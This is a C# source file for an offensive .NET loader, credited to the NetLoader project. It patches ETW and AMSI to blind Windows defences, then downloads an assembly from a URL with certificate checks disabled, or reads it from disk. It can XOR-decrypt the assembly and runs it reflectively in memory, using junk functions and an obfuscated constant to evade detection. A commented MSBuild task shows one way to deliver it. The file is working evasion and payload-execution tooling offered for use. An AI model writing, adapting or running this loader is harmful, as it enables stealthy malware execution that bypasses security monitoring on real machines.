using System;
using System.IO;
using System.Net;
using System.Text;
using System.Reflection;
using static NetRunners.Patchers.Patchers;
using static NetRunners.Heuristics.Heuristics;


/* Uncomment this when deploying from MSBuild payload

using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

   //This is for MSBuild later
  public class ClassExample : Task, ITask
  {
      public override bool Execute()
      {
          Loader.Main(new string[] { "--path", "\\smbshare\Seatbelt.exe" });
          return true;
      }
  }
 */

// Credits: https://github.com/Flangvik/NetLoader
public class NetLoader
{
    private static byte[] xorEncDec(byte[] inputData, string keyPhrase)
    {
        byte[] keyBytes = Encoding.UTF8.GetBytes(keyPhrase); // Convert keyPhrase to bytes
        byte[] bufferBytes = new byte[inputData.Length];

        for (int i = 0; i < inputData.Length; i++)
        {
            bufferBytes[i] = (byte)(inputData[i] ^ keyBytes[i % keyBytes.Length]);
        }
        return bufferBytes;
    }

    private static object[] globalArgs = null;

    public static void Main(string[] args)
    {
        // call patchers
        if ((!PatchEtw()) || (!PatchAmsi()))
            return;

        string payloadPathOrUrl = "";
        string[] payloadArgs = new string[] { };

        bool base64Enc = false;
        bool xorEnc = false;
        string xorKey = "";

        int secProTypeHolde = (Convert.ToInt32("384") * Convert.ToInt32("8"));
        if (args.Length > 0)
        {

            foreach (string argument in args)
            {

                if (argument.ToLower() == "--b64" || argument.ToLower() == "-b64")
                {
                    base64Enc = true;
                    Console.WriteLine("[+] All arguments are Base64 encoded, decoding them on the fly");
                }

                if (argument.ToLower() == "-xor" || argument.ToLower() == "--xor")
                {
                    xorEnc = true;

                    int argData = Array.IndexOf(args, argument) + 1;
                    if (argData < args.Length)
                    {
                        string rawArg = args[argData];
                        if (base64Enc)
                            xorKey = Encoding.UTF8.GetString(Convert.FromBase64String(rawArg));
                        else
                            xorKey = rawArg;
                    }

                    Console.WriteLine("[+] Decrypting XOR encrypted binary using key '{0}'", xorKey);
                }

                if (argument.ToLower() == "-path" || argument.ToLower() == "--path")
                {
                    int argData = Array.IndexOf(args, argument) + 1;
                    if (argData < args.Length)
                    {
                        string rawPayload = args[argData];
                        if (base64Enc)
                            payloadPathOrUrl = Encoding.UTF8.GetString(Convert.FromBase64String(rawPayload));
                        else
                            payloadPathOrUrl = rawPayload;
                    }
                }

                if (argument.ToLower() == "-args" || argument.ToLower() == "--args")
                {
                    int binaryArgsIndex = Array.IndexOf(args, argument) + 1;
                    int nbBinaryArgs = args.Length - binaryArgsIndex;

                    payloadArgs = new String[nbBinaryArgs];


                    for (int i = 0; i < nbBinaryArgs; i++)
                    {
                        string rawPayloadArgs = args[binaryArgsIndex + i];

                        if (base64Enc)
                            payloadArgs[i] = Encoding.UTF8.GetString(Convert.FromBase64String(rawPayloadArgs));
                        else
                            payloadArgs[i] = rawPayloadArgs;
                    }
                }
            }

            if (string.IsNullOrEmpty(payloadPathOrUrl))
            {
                printHelp();
                Environment.Exit(0);
            }

            TriggerPayload(payloadPathOrUrl, payloadArgs, xorEnc, xorKey, secProTypeHolde);
            Environment.Exit(0);
        }
    }

    private static void printHelp()
    {

        Console.WriteLine("Usage: ");
        Console.WriteLine("Usage: [-b64] [-xor <key>] -path <binary_path> [-args <binary_args>]");
        Console.WriteLine("\t-b64: Optionnal flag parameter indicating that all other parameters are base64 encoded.");
        Console.WriteLine("\t-xor: Optionnal parameter indicating that binary files are XOR encrypted. Must be followed by the XOR decryption key.");
        Console.WriteLine("\t-path: Mandatory parameter. Indicates the path, either local or a URL, of the binary to load.");
        Console.WriteLine("\t-args: Optionnal parameter used to pass arguments to the loaded binary. Must be followed by all arguments for the binary.");
    }

    private static Assembly loadASM(byte[] byteArray)
    {
        return Assembly.Load(byteArray);
    }

    private static byte[] readLocalFilePath(string filePath, FileMode fileMode)
    {
        byte[] buffer = null;
        using (FileStream fs = new FileStream(filePath, fileMode, FileAccess.Read))
        {
            buffer = new byte[fs.Length];
            fs.Read(buffer, 0, (int)fs.Length);
        }
        return buffer;

    }

    private static Type junkFunction(MethodInfo methodInfo)
    {
        return methodInfo.ReflectedType;
    }
    private static object invokeCSharpMethod(MethodInfo methodInfo)
    {
        if (junkFunction(methodInfo) == methodInfo.ReflectedType)
            methodInfo.Invoke(null, globalArgs);
        Console.ReadLine();
        return globalArgs[0];
    }

    private static byte[] downloadURL(string url)
    {
        // Bypass SSL certificate validation
        ServicePointManager.ServerCertificateValidationCallback +=
            (sender, cert, chain, sslPolicyErrors) => true;

        HttpWebRequest myRequest = (HttpWebRequest)WebRequest.Create(url);
        myRequest.Proxy.Credentials = CredentialCache.DefaultCredentials;
        myRequest.Method = "GET";
        WebResponse myResponse = myRequest.GetResponse();
        MemoryStream ms = new MemoryStream();
        myResponse.GetResponseStream().CopyTo(ms);
        return ms.ToArray();
    }

    public static int setProtocolTLS(int secProt)
    {
        ServicePointManager.SecurityProtocol = (SecurityProtocolType)secProt;
        return secProt;
    }
    private static MethodInfo getEntryPoint(Assembly asm)
    {

        return asm.EntryPoint;
    }

    private static void TriggerPayload(string payloadPathOrURL, string[] inputArgs, bool xorEncoded, string xorKey, int setProtType = 0)
    {
        setProtocolTLS(setProtType);

        if (!string.IsNullOrEmpty(string.Join(" ", inputArgs)))
            Console.WriteLine("[+] URL/PATH : " + payloadPathOrURL + " Arguments : " + string.Join(" ", inputArgs));
        else
        {
            Console.WriteLine("[+] URL/PATH : " + payloadPathOrURL + " Arguments : " + string.Join(" ", inputArgs));
        }
        globalArgs = new object[] { inputArgs };

        if (xorEncoded && payloadPathOrURL.ToLower().StartsWith("http"))
        {

            encDeploy(downloadURL(payloadPathOrURL), xorKey);
        }
        else if (!xorEncoded && payloadPathOrURL.ToLower().StartsWith("http"))
        {

            unEncDeploy(downloadURL(payloadPathOrURL));
        }
        else if (!xorEncoded && !payloadPathOrURL.ToLower().StartsWith("http"))
            unEncDeploy(readLocalFilePath(payloadPathOrURL, FileMode.Open));
        else
            encDeploy(readLocalFilePath(payloadPathOrURL, FileMode.Open), xorKey);

    }

    private static void encDeploy(byte[] data, string xorKey)
    {

        invokeCSharpMethod(getEntryPoint(loadASM(xorEncDec(data, xorKey))));

    }

    private static void unEncDeploy(byte[] data)
    {

        invokeCSharpMethod(getEntryPoint(loadASM(data)));

    }
}